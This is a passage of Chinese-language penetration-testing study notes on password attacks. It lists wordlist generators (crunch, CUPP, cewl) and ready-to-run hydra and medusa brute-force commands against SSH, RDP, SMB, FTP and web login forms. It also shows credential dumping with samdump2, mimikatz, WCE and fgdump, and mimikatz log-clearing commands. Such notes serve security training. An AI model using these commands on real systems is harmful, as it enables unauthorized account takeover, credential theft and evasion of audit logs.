r><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"> 密码破解</span><br><span class="line">密码破解方法</span><br><span class="line"></span><br><span class="line">密码破解方法</span><br><span class="line"></span><br><span class="line">    人工猜解</span><br><span class="line">        垃圾桶工具</span><br><span class="line">        被动信息收集</span><br><span class="line"></span><br><span class="line">    基于字典暴力破解（主流）</span><br><span class="line">    键盘空间字符爆破</span><br><span class="line"></span><br><span class="line">    字典</span><br><span class="line">        保存有用户名和密码的文本文件</span><br><span class="line">        /usr/share/wordlist</span><br><span class="line">        /usr/share/wfuzz/wordlist</span><br><span class="line">        /usr/share/seclists</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> crunch 创建密码字典</span><br><span class="line"></span><br><span class="line">    crunch [] [options]</span><br><span class="line">        -b 按大小分割文件（kb/kib、mb/mib、gb/gib）</span><br><span class="line">        -c 每个字典的行数</span><br><span class="line">        以上两个参数必须与</span><br><span class="line">         -o START 结合使用</span><br><span class="line"></span><br><span class="line">        -d 同一字符连贯出现数量（11/aaa）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CUPP 按个人信息生成其专属的密码字典</span><br><span class="line"></span><br><span class="line">    CUPP：Common User Password Profiler</span><br><span class="line">        git clone https://github.com/Mebus/cupp.git</span><br><span class="line">        python cupp.py -i</span><br><span class="line"></span><br><span class="line"> cewl 通过收集网站信息生成字典</span><br><span class="line"></span><br><span class="line">    cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt</span><br><span class="line">        -m：最小单词长度</span><br><span class="line">        -d：爬网深度</span><br><span class="line">        -e：收集包含email地址信息</span><br><span class="line">        -c：每个单词出现次数</span><br><span class="line">        支持基本、摘要 身份认证</span><br><span class="line">        支持代理</span><br><span class="line"></span><br><span class="line">在线密码破解—–hydra</span><br><span class="line">                                      </span><br><span class="line"></span><br><span class="line">破解https：</span><br><span class="line">hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</span><br><span class="line"></span><br><span class="line">破解teamspeak：</span><br><span class="line">hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</span><br><span class="line"></span><br><span class="line">破解cisco：</span><br><span class="line">hydra -P pass.txt 10.36.16.18 cisco</span><br><span class="line">hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</span><br><span class="line"></span><br><span class="line">破解smb：</span><br><span class="line">hydra -l administrator -P pass.txt 10.36.16.18 smb</span><br><span class="line"></span><br><span class="line">破解pop3：</span><br><span class="line">hydra -l muts -P pass.txt my.pop3.mail pop3</span><br><span class="line"></span><br><span class="line">破解rdp：</span><br><span class="line">hydra ip rdp -L users.txt -P pass.txt -V</span><br><span class="line"></span><br><span class="line">破解http-proxy：</span><br><span class="line">hydra -l admin -P pass.txt http-proxy://10.36.16.18</span><br><span class="line"></span><br><span class="line">破解imap：</span><br><span class="line">hydra -L user.txt -p secret 10.36.16.18 imap PLAIN</span><br><span class="line">hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</span><br><span class="line"></span><br><span class="line">破解telnet</span><br><span class="line">hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</span><br><span class="line"></span><br><span class="line">- xhydra</span><br><span class="line"></span><br><span class="line">root@K:~# hydra -l administrator -P john.txt rdp://192.168.1.118 -t 1 -vV  破解速度慢，正确率高</span><br><span class="line">root@K:~# hydra -L user.txt -P john.txt ftp://1.1.1.1 -s 2121（端口号） -e nsr -o p.txt -t 64 -vV</span><br><span class="line">root@K:~# hydra -l root -P pass.lst ssh://192.168.1.113 -e nsr -vV   //-e nsr 空密码验证</span><br><span class="line"></span><br><span class="line">medusa</span><br><span class="line"></span><br><span class="line">medusa  -d </span><br><span class="line"></span><br><span class="line">Medusa的特点                                  </span><br><span class="line">    - 稳定性好                                </span><br><span class="line">    - 速度控制得当                            </span><br><span class="line">    - 基于线程                                </span><br><span class="line">    - 支持模块少于hydra（不支持RDP ）         </span><br><span class="line">    - WEB-Form支持存在缺陷</span><br><span class="line">Hydra的缺点                                   </span><br><span class="line">    - 稳定性差，程序时常崩溃                  </span><br><span class="line">    - 速度控制不好，容易触发服务屏蔽或锁死机制</span><br><span class="line">    - 每主机新建进程，每服务新建实例          </span><br><span class="line">    - 大量目标破解时性能差         </span><br><span class="line"></span><br><span class="line">-h [TEXT]      目标IP</span><br><span class="line">-H [FILE]      目标主机文件</span><br><span class="line">-u [TEXT]      用户名</span><br><span class="line">-U [FILE]      用户名文件</span><br><span class="line">-p [TEXT]      密码</span><br><span class="line">-P [FILE]      密码文件</span><br><span class="line">-C [FILE]      组合条目文件</span><br><span class="line">-O [FILE]      文件日志信息</span><br><span class="line">-e [n/s/ns]    N意为空密码，S意为密码与用户名相同</span><br><span class="line">-M [TEXT]      模块执行名称</span><br><span class="line">-m [TEXT]      传递参数到模块</span><br><span class="line">-d             显示所有的模块名称</span><br><span class="line">-n [NUM]       使用非默认端口</span><br><span class="line">-s             启用SSL</span><br><span class="line">-r [NUM]       重试间隔时间，默认为3秒</span><br><span class="line">-t [NUM]       设定线程数量</span><br><span class="line">-L             并行化，每个用户使用一个线程</span><br><span class="line">-f             在任何主机上找到第一个账号/密码后，停止破解</span><br><span class="line">-q             显示模块的使用信息</span><br><span class="line">-v [NUM]       详细级别（0-6）</span><br><span class="line">-w [NUM]       错误调试级别（0-10）</span><br><span class="line">-V             显示版本</span><br><span class="line">-Z [TEXT]      继续扫描上一次</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">medusa -d                                                </span><br><span class="line"></span><br><span class="line">破解windows密码                                      </span><br><span class="line"></span><br><span class="line">    - medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -e ns -F</span><br><span class="line"></span><br><span class="line">破解Linux SSH密码                                    </span><br><span class="line"></span><br><span class="line">    - medusa -M ssh -h 192.168.20.10 -u root -P pass.lst -e ns -F     </span><br><span class="line"></span><br><span class="line">其他服务密码破解                                 </span><br><span class="line"></span><br><span class="line">    - medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F         </span><br><span class="line"></span><br><span class="line">    - medusa -h 1.1.1.1 -u admin -P pass.lst -M web-form -m           </span><br><span class="line"></span><br><span class="line">      FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORM-       </span><br><span class="line"></span><br><span class="line">      DATA:&quot;post?user=username&amp;pas=password&amp;Login=Login&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@K:~# medusa -h 192.168.1.113 -u admin -P pass.lst -M web-form -m FORM:&quot;dvwa/login.php&quot; -m DENY-SIGNAL:&quot;login.php&quot; -m FORM-DATA:&quot;post?user=username&amp;pas=password&amp;Login=Login&quot;</span><br><span class="line"></span><br><span class="line">    - -n : 非默认端口   </span><br><span class="line"></span><br><span class="line">    - -s : 使用SSL连接  </span><br><span class="line"></span><br><span class="line">    - -T : 并发主机数   </span><br><span class="line"></span><br><span class="line">medusa -M ftp -q</span><br><span class="line"></span><br><span class="line">离线密码破解</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">身份认证                          </span><br><span class="line">    - 禁止明文传输密码                                                </span><br><span class="line">    - 每次认证使用HASH算法加密密码传输）（HASH算法加密容易、解密困难）</span><br><span class="line">    - 服务器端用户数据库应加盐加密保存                                </span><br><span class="line"></span><br><span class="line">破解思路                                                              </span><br><span class="line">    - 嗅探获取密码HASH                                                </span><br><span class="line">    - 利用漏洞登录服务器并从用户数据库获取密码HASH                    </span><br><span class="line">    - 识别HASH类型                    </span><br><span class="line">      长度、字符集         </span><br><span class="line">    - 利用李璇破解工具碰撞密码HASH</span><br><span class="line">离线密码破解                                </span><br><span class="line">优势                                        </span><br><span class="line">    - 离线不会触发密码锁定机制              </span><br><span class="line">    - 不会产生大量登录失败日志引起管理员注意</span><br><span class="line"></span><br><span class="line">HASH识别工具                                </span><br><span class="line"> - Hashid                                </span><br><span class="line"> - hash-identifier      </span><br><span class="line"></span><br><span class="line">Windows HASH获取工具                          </span><br><span class="line"></span><br><span class="line">    - 利用漏洞: Pwdump、fgdump、mimikatz、wce</span><br><span class="line">    - 物理接触: samdump2                      </span><br><span class="line">    - Kali ISO 启动虚拟机                     </span><br><span class="line">    - mount /dev/sdal /mnt                    </span><br><span class="line">    - cd /mnt/Windows/System32/config         </span><br><span class="line">    - samdump2 SYSTEM SAM -o sam.hash         </span><br><span class="line">    - 利用nc传输HASH</span><br><span class="line"></span><br><span class="line">mimikatz</span><br><span class="line"></span><br><span class="line">privilege::debug  #提升权限；</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords   #查看登录状态的账户和密码；</span><br><span class="line">event::clear    # 清除操作系统的安全日志</span><br><span class="line">event::drop      #不再进行新的日志</span><br><span class="line">misc::cmd    #打开cmd命令行窗口；</span><br><span class="line">process模块</span><br><span class="line"></span><br><span class="line">查看可以执行的子模块；</span><br><span class="line">token模块</span><br><span class="line">token::whoami</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> WCE（Windows credential editor）——Windows身份验证信息编辑器</span><br><span class="line"></span><br><span class="line"> @root:/usr/share/windows-resources/wce</span><br><span class="line"></span><br><span class="line">  wce-universal.exe -l</span><br><span class="line"></span><br><span class="line"># 查看当前登录的账户和加密的密码，其中，计算机名也会被当做用户来处理；</span><br><span class="line">wce-universal.exe -lv</span><br><span class="line"></span><br><span class="line"># 查看登录状态用户的详细信息，包括LUID，账户和加密后的密码等；</span><br><span class="line"></span><br><span class="line"># 查看信息时，首先尝试安全模式，直接从内存中读取信息，读取失败后，会尝试注入模式（可能对系统造成损害）</span><br><span class="line"> wce-universal.exe -w</span><br><span class="line"></span><br><span class="line"># 以明文形式读取密码，最常用和实际的作用；</span><br><span class="line"></span><br><span class="line">Fgdump工具</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fgdump是集成在Kali上的Windows工具；可以下载到win_XP上使用；</span><br><span class="line"></span><br><span class="line">双击fgdump,可以得到如下三个文件，其中一个包括账户和加密的密码文件；</span><br><span class="line"></span><br><span class="line">获取到加密的密码后，可以通过Kali集成的工具进行hash碰撞；</span><br><span class="line"></span><br><span class="line">F40460FE1CEEC6F6785997F3319553BB</span><br><span class="line">f40460fe1ceec6f6785997f3319553bb</span><br></pre></td></tr></table></figure>
